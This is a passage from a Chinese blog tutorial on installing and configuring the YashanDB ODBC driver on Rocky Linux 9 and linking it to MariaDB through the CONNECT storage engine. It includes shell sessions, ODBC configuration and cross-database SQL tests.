unixODBC-devel-2.3.9-4.el9.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<h2 id="YashanDB-ODBC-驱动安装">YashanDB ODBC 驱动安装</h2>
<h3 id="下载-YashanDB-ODBC">下载 YashanDB ODBC</h3>
<p>进入 YashanDB <a class="link"   href="https://download.yashandb.com/download" >下载中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，选择 【YashanDB Connector/ODBC (Linux X86)】，并 <a class="link"   href="https://linked.yashandb.com/resource/yashandb-odbc-23.1.1.100-linux-x86_64.tar.gz" >下载 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 yashan]$ ll -h</span><br><span class="line">total 243M</span><br><span class="line">-rw-r--r-- 1 shawnyan shawnyan 176K Nov  2 16:40 yashandb-odbc-23.1.1.100-linux-x86_64.tar.gz</span><br><span class="line">-rw-r--r-- 1 shawnyan shawnyan 243M Nov 21 16:29 yashandb-personal-23.1.1.100-linux-x86_64.tar.gz</span><br><span class="line">[shawnyan@rocky9 yashan]$</span><br></pre></td></tr></table></figure></div>
<h3 id="解压、安装-ODBC-驱动">解压、安装 ODBC 驱动</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 yashandb-odbc-23.1.1.100-linux-x86_64]$ ll -h</span><br><span class="line">total 724K</span><br><span class="line">-rwxrwxr-x 1 shawnyan shawnyan 197K Oct 19 17:01 libyas_odbc.so</span><br><span class="line">-rwxrwxr-x 1 shawnyan shawnyan 197K Oct 19 17:01 libyas_odbc.so.0</span><br><span class="line">-rwxrwxr-x 1 shawnyan shawnyan 197K Oct 19 17:01 libyas_odbc.so.0.1.0</span><br><span class="line">-rwxrwxr-x 1 shawnyan shawnyan 8.4K Oct 19 17:01 yasodbcinstall</span><br><span class="line">-rwxrwxr-x 1 shawnyan shawnyan 112K Oct 19 17:01 yasodbctest</span><br><span class="line">[shawnyan@rocky9 yashandb-odbc-23.1.1.100-linux-x86_64]$</span><br></pre></td></tr></table></figure></div>
<p>Ps. <code>yasodbcinstall</code> 这个工具并不好用，直接执行后，会生成乱码。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 yashan]# cat /etc/odbcinst.ini | tail -n4</span><br><span class="line">[YashanDB ODBC Driver]</span><br><span class="line">@=</span><br><span class="line">UsageCount=1</span><br><span class="line"></span><br><span class="line">[root@rocky9 yashan]# </span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>官方文档里没有该工具的说明，暂且忽略掉了。</p>
</blockquote>
<h3 id="配置驱动-odbcinst-ini">配置驱动 odbcinst.ini</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 yashan]# vi /etc/odbcinst.ini</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">YashanDB</span>]</span><br><span class="line"><span class="string">Description</span>     <span class="string">=</span> <span class="string">ODBC</span> <span class="string">for</span> <span class="string">YashanDB</span></span><br><span class="line"><span class="string">Driver</span>          <span class="string">=</span> <span class="string">/usr/lib64/yashandb/libyas_odbc.so</span></span><br><span class="line"><span class="string">Setup</span>           <span class="string">=</span> <span class="string">/usr/lib64/yashandb/libyas_odbc.so</span></span><br><span class="line"><span class="string">Driver64</span>        <span class="string">=</span> <span class="string">/usr/lib64/yashandb/libyas_odbc.so</span></span><br><span class="line"><span class="string">Setup64</span>         <span class="string">=</span> <span class="string">/usr/lib64/yashandb/libyas_odbc.so</span></span><br><span class="line"><span class="string">FileUsage</span>       <span class="string">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<h3 id="配置-YashanDB-数据源">配置 YashanDB 数据源</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 yashan]# vi /etc/odbc.ini</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">YashanDB</span>]</span><br><span class="line"><span class="string">Description</span>  <span class="string">=</span> <span class="string">YashanDB</span></span><br><span class="line"><span class="string">Driver</span>       <span class="string">=</span> <span class="string">YashanDB</span></span><br><span class="line"><span class="string">SERVER</span>       <span class="string">=</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="string">PORT</span>         <span class="string">=</span> <span class="number">1688</span></span><br><span class="line"><span class="string">USER</span>         <span class="string">=</span> <span class="string">sys</span></span><br><span class="line"><span class="string">PWD</span>          <span class="string">=</span> <span class="string">yasdb_123</span></span><br></pre></td></tr></table></figure></div>
<h3 id="使用-isql-测试连接-YashanDB">使用 isql 测试连接 YashanDB</h3>
<p>连接数据库：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">isql -v YashanDB</span><br></pre></td></tr></table></figure></div>
<p>测试输出：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[yashan@rocky9 yashandb]$ isql -v YashanDB</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| Connected!                            |</span><br><span class="line">|                                       |</span><br><span class="line">| sql-statement                         |</span><br><span class="line">| help [tablename]                      |</span><br><span class="line">| quit                                  |</span><br><span class="line">|                                       |</span><br><span class="line">+---------------------------------------+</span><br><span class="line"><span class="meta prompt_">SQL&gt; </span><span class="language-bash"><span class="keyword">select</span> * from sbtest.t1</span></span><br><span class="line">+------------+</span><br><span class="line">| ID         |</span><br><span class="line">+------------+</span><br><span class="line">| 1          |</span><br><span class="line">+------------+</span><br><span class="line">SQLRowCount returns 0</span><br><span class="line">1 rows fetched</span><br><span class="line"><span class="meta prompt_">SQL&gt; </span><span class="language-bash"><span class="keyword">select</span> * from sbtest.t2</span></span><br><span class="line">[S1000][YashanDB][ODBC Driver][Yas][1:15]YAS-02012 table or view does not exist</span><br><span class="line">[ISQL]ERROR: Could not SQLPrepare</span><br><span class="line"><span class="meta prompt_">SQL&gt; </span><span class="language-bash"><span class="keyword">select</span> * from sbtest1.t1</span></span><br><span class="line">[S1000][YashanDB][ODBC Driver][Yas][1:15]YAS-02010 user &#x27;SBTEST1&#x27; does not exist</span><br><span class="line">[ISQL]ERROR: Could not SQLPrepare</span><br><span class="line"><span class="meta prompt_">SQL&gt; </span><span class="language-bash">quit</span></span><br><span class="line">[yashan@rocky9 yashandb]$</span><br></pre></td></tr></table></figure></div>
<p>出现 <code>Connected</code> 就说明已经连接成功。后面做了两个测试，查询不存在的表和不存在的模式，都会报错，符合预期。</p>
<h3 id="使用自带的-yasodbctest-程序测试连接">使用自带的 yasodbctest 程序测试连接</h3>
<p>连接数据库：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./yasodbctest YashanDB</span><br></pre></td></tr></table></figure></div>
<p>测试输出：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[yashan@rocky9 yashandb]$ ./yasodbctest YashanDB</span><br><span class="line">Connected!</span><br><span class="line">Enter SQL commands, type (control)Z to exit</span><br><span class="line">SQL COMMAND&gt;select 1 from dual</span><br><span class="line">| 1            |</span><br><span class="line">|           1  |</span><br><span class="line"></span><br><span class="line">SQL COMMAND&gt;select * from sbtest.t1</span><br><span class="line">| ID           |</span><br><span class="line">|           1  |</span><br><span class="line"></span><br><span class="line">SQL COMMAND&gt;select * from sbtest1.t1</span><br><span class="line">[HY000] [YashanDB][ODBC Driver][Yas][1:15]YAS-02010 user &#x27;SBTEST1&#x27; does not exist (2010)</span><br><span class="line">SQL COMMAND&gt;exit</span><br><span class="line"></span><br><span class="line">Disconnected.</span><br><span class="line">[yashan@rocky9 yashandb]$</span><br></pre></td></tr></table></figure></div>
<p>到此，通过 ODBC 连接 YashanDB 数据库已讲解完成，下面将介绍如何凭借 ODBC 将 MariaDB 和 YashanDB 连接。</p>
<h2 id="连接-YashanDB-和-MariaDB">连接 YashanDB 和 MariaDB</h2>
<h3 id="安装-MairaDB-及-CONNECT-引擎">安装 MairaDB 及 CONNECT 引擎</h3>
<p>这一部分内容并不是本文重点，所以仅做简要说明。</p>
<p><a class="link"   href="https://dlm.mariadb.com/3578925/MariaDB/mariadb-10.6.16/yum/rhel/mariadb-10.6.16-rhel-9-x86_64-rpms.tar" >下载 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> MariaDB 安装包。</p>
<!--
https://dlm.mariadb.com/3582730/MariaDB/mariadb-10.6.16/yum/centos/mariadb-10.6.16-rhel-7-x86_64-rpms.tar
-->
<p>解压、安装：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo dnf install MariaDB-server MariaDB-connect-engine</span><br><span class="line">Last metadata expiration check: 0:01:49 ago on Tue 28 Nov 2023 10:37:52 AM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">================================================================================</span><br><span class="line"> Package                    Arch       Version              Repository     Size</span><br><span class="line">================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> MariaDB-connect-engine     x86_64     10.6.16-1.el9        MariaDB       2.6 M</span><br><span class="line"> MariaDB-server             x86_64     10.6.16-1.el9        MariaDB        18 M</span><br><span class="line">Installing dependencies:</span><br><span class="line"> MariaDB-client             x86_64     10.6.16-1.el9        MariaDB       8.5 M</span><br><span class="line"> MariaDB-common             x86_64     10.6.16-1.el9        MariaDB        88 k</span><br><span class="line"> MariaDB-shared             x86_64     10.6.16-1.el9        MariaDB       131 k</span><br><span class="line"> daxctl-libs                x86_64     71.1-8.el9           baseos         41 k</span><br><span class="line"> galera-4                   x86_64     26.4.16-1.el9        MariaDB       1.4 M</span><br><span class="line"> libpmem                    x86_64     1.12.1-1.el9         appstream     111 k</span><br><span class="line"> ndctl-libs                 x86_64     71.1-8.el9           baseos         88 k</span><br><span class="line"> socat                      x86_64     1.7.4.1-5.el9        appstream     300 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">================================================================================</span><br><span class="line">Install  10 Packages</span><br><span class="line"></span><br><span class="line">Total size: 31 M</span><br><span class="line">Total download size: 539 k</span><br><span class="line">Installed size: 208 M</span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">...</span><br><span class="line">Installed:</span><br><span class="line">  MariaDB-client-10.6.16-1.el9.x86_64</span><br><span class="line">  MariaDB-common-10.6.16-1.el9.x86_64</span><br><span class="line">  MariaDB-connect-engine-10.6.16-1.el9.x86_64</span><br><span class="line">  MariaDB-server-10.6.16-1.el9.x86_64</span><br><span class="line">  MariaDB-shared-10.6.16-1.el9.x86_64</span><br><span class="line">  daxctl-libs-71.1-8.el9.x86_64</span><br><span class="line">  galera-4-26.4.16-1.el9.x86_64</span><br><span class="line">  libpmem-1.12.1-1.el9.x86_64</span><br><span class="line">  ndctl-libs-71.1-8.el9.x86_64</span><br><span class="line">  socat-1.7.4.1-5.el9.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<h3 id="启动-MariaDB-Server-并查看-CONNECT-存储引擎">启动 MariaDB Server 并查看 CONNECT 存储引擎</h3>
<ul>
<li>启动 MariaDB Server</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo systemctl start mariadb</span><br><span class="line">[shawnyan@rocky9 ~]$ systemctl status mariadb</span><br><span class="line">● mariadb.service - MariaDB 10.6.16 database server</span><br><span class="line">     Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; preset:&gt;</span><br><span class="line">    Drop-In: /etc/systemd/system/mariadb.service.d</span><br><span class="line">             └─migrated-from-my.cnf-settings.conf</span><br><span class="line">     Active: active (running) since Tue 2023-11-28 10:40:59 UTC; 1s ago</span><br><span class="line">       Docs: man:mariadbd(8)</span><br><span class="line">             https://mariadb.com/kb/en/library/systemd/</span><br><span class="line">    Process: 196683 ExecStartPre=/bin/sh -c systemctl unset-environment _WSREP_&gt;</span><br><span class="line">    Process: 196684 ExecStartPre=/bin/sh -c [ ! -e /usr/bin/galera_recovery ] &amp;&gt;</span><br><span class="line">    Process: 196706 ExecStartPost=/bin/sh -c systemctl unset-environment _WSREP&gt;</span><br><span class="line">   Main PID: 196695 (mariadbd)</span><br><span class="line">     Status: &quot;Taking your SQL requests now...&quot;</span><br><span class="line">      Tasks: 12 (limit: 22756)</span><br><span class="line">     Memory: 62.3M</span><br><span class="line">        CPU: 247ms</span><br><span class="line">     CGroup: /system.slice/mariadb.service</span><br><span class="line">             └─196695 /usr/sbin/mariadbd</span><br><span class="line"></span><br><span class="line">Nov 28 10:40:59 rocky9.shawnyan.cn mariadbd[196695]: 2023-11-28 10:40:59 0 [Not&gt;</span><br><span class="line">Nov 28 10:40:59 rocky9.shawnyan.cn mariadbd[196695]: 2023-11-28 10:40:59 0 [Not&gt;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查看 CONNECT 存储引擎</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [information_schema]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.PLUGINS <span class="keyword">where</span> PLUGIN_NAME <span class="operator">=</span> <span class="string">&#x27;CONNECT&#x27;</span>\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">           PLUGIN_NAME: <span class="keyword">CONNECT</span></span><br><span class="line">        PLUGIN_VERSION: <span class="number">1.7</span></span><br><span class="line">         PLUGIN_STATUS: ACTIVE</span><br><span class="line">           PLUGIN_TYPE: STORAGE ENGINE</span><br><span class="line">   PLUGIN_TYPE_VERSION: <span class="number">100616.0</span></span><br><span class="line">        PLUGIN_LIBRARY: ha_connect.so</span><br><span class="line">PLUGIN_LIBRARY_VERSION: <span class="number">1.14</span></span><br><span class="line">         PLUGIN_AUTHOR: Olivier Bertrand</span><br><span class="line">    PLUGIN_DESCRIPTION: Management <span class="keyword">of</span> <span class="keyword">External</span> Data (<span class="keyword">SQL</span><span class="operator">/</span>NOSQL<span class="operator">/</span>MED), including Rest query results</span><br><span class="line">        PLUGIN_LICENSE: GPL</span><br><span class="line">           LOAD_OPTION: <span class="keyword">ON</span></span><br><span class="line">       PLUGIN_MATURITY: Stable</span><br><span class="line">   PLUGIN_AUTH_VERSION: <span class="number">1.07</span><span class="number">.0003</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>可以看到 CONNECT 存储引擎已经安装成功，并处于激活状态。</p>
<h3 id="创建-CONNECT-表">创建 CONNECT 表</h3>
<p>在 MariaDB 中创建表 <code>t1</code>，表类型为 ODBC，通过刚才配置的 <code>odbc.ini</code> 远程连接到 YashanDB，连接到 YashanDB 中的 <code>USERNAME.T1</code> 表。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">TABLE</span> t1 (id <span class="type">varchar</span>(<span class="number">2</span>)) </span><br><span class="line">ENGINE<span class="operator">=</span><span class="keyword">CONNECT</span> TABLE_TYPE<span class="operator">=</span>ODBC </span><br><span class="line">CONNECTION<span class="operator">=</span><span class="string">&#x27;DSN=YashanDB&#x27;</span> TABNAME<span class="operator">=</span><span class="string">&#x27;USERNAME.T1&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<p>查看建表语句：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> t1\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">       <span class="keyword">Table</span>: t1</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t1` (</span><br><span class="line">  `id` <span class="type">varchar</span>(<span class="number">2</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span><span class="keyword">CONNECT</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>latin1 <span class="keyword">COLLATE</span><span class="operator">=</span>latin1_swedish_ci CONNECTION<span class="operator">=</span><span class="string">&#x27;DSN=YashanDB&#x27;</span> `TABLE_TYPE`<span class="operator">=</span>ODBC `TABNAME`<span class="operator">=</span><span class="string">&#x27;USERNAME.T1&#x27;</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.002</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="测试-CONNECT-表">测试 CONNECT 表</h3>
<ul>
<li>在 MariaDB 侧写入数据</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.021</span> sec)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>在 YashanDB 侧读取数据</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> username.t1;</span><br><span class="line"></span><br><span class="line">          ID </span><br><span class="line"><span class="comment">------------ </span></span><br><span class="line">           <span class="number">1</span></span><br><span class="line">           <span class="number">2</span></span><br><span class="line">           <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> fetched.</span><br></pre></td></tr></table></figure></div>
<ul>
<li>在 MariaDB 和 YashanDB 同时增加字段</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- MariaDB</span></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">table</span> t1 <span class="keyword">add</span> <span class="keyword">column</span> name <span class="type">varchar</span>(<span class="number">10</span>);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.008</span> sec)</span><br><span class="line">Records: <span class="number">0</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- YashanDB</span></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">table</span> username.t1 <span class="keyword">add</span> <span class="keyword">column</span> name varchar2(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">Succeed.</span><br></pre></td></tr></table></figure></div>
<ul>
<li>在 MariaDB 侧更新数据</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">update</span> t1 <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;ShawnYan&#x27;</span> <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected, <span class="number">1</span> warning (<span class="number">0.021</span> sec)</span><br><span class="line"><span class="keyword">Rows</span> matched: <span class="number">0</span>  Changed: <span class="number">0</span>  Warnings: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> name     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> ShawnYan <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>    <span class="operator">|</span> ShawnYan <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>    <span class="operator">|</span> ShawnYan <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.017</span> sec)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>在 YashanDB 侧读取数据</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> username.t1;</span><br><span class="line"></span><br><span class="line">          ID NAME          </span><br><span class="line"><span class="comment">------------ ------------- </span></span><br><span class="line">           <span class="number">1</span> ShawnYan     </span><br><span class="line">           <span class="number">2</span> ShawnYan     </span><br><span class="line">           <span class="number">3</span> ShawnYan     </span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> fetched.</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是，如果 YashanDB 侧，增加列 <code>cd2 decimal(2,0)</code>，而 MairaDB 侧增加列 <code>cd2 decimal(2,1)</code>，那么，从 MariaDB 侧写入数据后，数据可能会被截断。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- MariaDB</span></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">update</span> t1 <span class="keyword">set</span> cd2 <span class="operator">=</span> <span class="number">1.1</span> <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected, <span class="number">1</span> warning (<span class="number">0.023</span> sec)</span><br><span class="line"><span class="keyword">Rows</span> matched: <span class="number">0</span>  Changed: <span class="number">0</span>  Warnings: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+------+------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> name     <span class="operator">|</span> cd   <span class="operator">|</span> cd2  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+------+------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> ShawnYan <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  <span class="number">1.0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>    <span class="operator">|</span> ShawnYan <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  <span class="number">1.0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>    <span class="operator">|</span> ShawnYan <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  <span class="number">1.0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+------+------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.017</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- YashanDB</span></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> username.t1;</span><br><span class="line"></span><br><span class="line">          ID NAME                   CD         CD2 </span><br><span class="line"><span class="comment">------------ ------------- ----------- ----------- </span></span><br><span class="line">           <span class="number">1</span> ShawnYan                <span class="number">1</span>           <span class="number">1</span></span><br><span class="line">           <span class="number">2</span> ShawnYan                <span class="number">1</span>           <span class="number">1</span></span><br><span class="line">           <span class="number">3</span> ShawnYan                <span class="number">1</span>           <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> fetched.</span><br></pre></td></tr></table></figure></div>
<p>但是，如果两边增加相同精度的列，则不会出现这个问题。</p>
<ul>
<li>分别查看 <code>t1</code> 表在 MariaDB 和 YashanDB 中的表结构。</li>
</ul>
<p>-&gt; MariaDB</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">desc</span> t1;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field <span class="operator">|</span> Type         <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> id    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">2</span>)   <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">10</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cd    <span class="operator">|</span> <span class="type">decimal</span>(<span class="number">2</span>,<span class="number">0</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cd2   <span class="operator">|</span> <span class="type">decimal</span>(<span class="number">2</span>,<span class="number">1</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cd3   <span class="operator">|</span> <span 